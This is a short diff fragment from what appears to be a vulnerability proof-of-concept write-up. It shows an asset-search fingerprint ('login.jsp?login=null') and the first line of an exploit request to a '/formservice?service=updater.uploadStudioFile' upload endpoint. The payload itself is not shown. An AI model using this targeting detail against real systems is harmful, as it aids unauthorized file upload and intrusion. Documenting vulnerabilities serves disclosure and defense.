@@ -8,7 +8,7 @@
 body="login.jsp?login=null"
 ```
 
-## poc
+## POC
 
 ```
 POST /formservice?service=updater.uploadStudioFile HTTP/1.1
